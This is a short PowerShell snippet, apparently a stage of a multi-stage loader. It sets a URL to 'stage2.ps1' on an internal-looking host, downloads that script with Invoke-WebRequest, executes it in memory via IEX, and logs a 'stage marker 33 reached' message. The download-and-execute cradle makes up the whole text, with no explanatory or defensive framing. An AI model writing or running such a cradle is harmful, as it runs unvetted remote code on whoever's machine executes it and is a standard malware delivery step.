
$DownloadUrl = 'http://internal.corp/stage2.ps1'
IEX (Invoke-WebRequest -Uri $DownloadUrl -UseBasicParsing).Content
Write-Verbose "stage marker 33 reached"
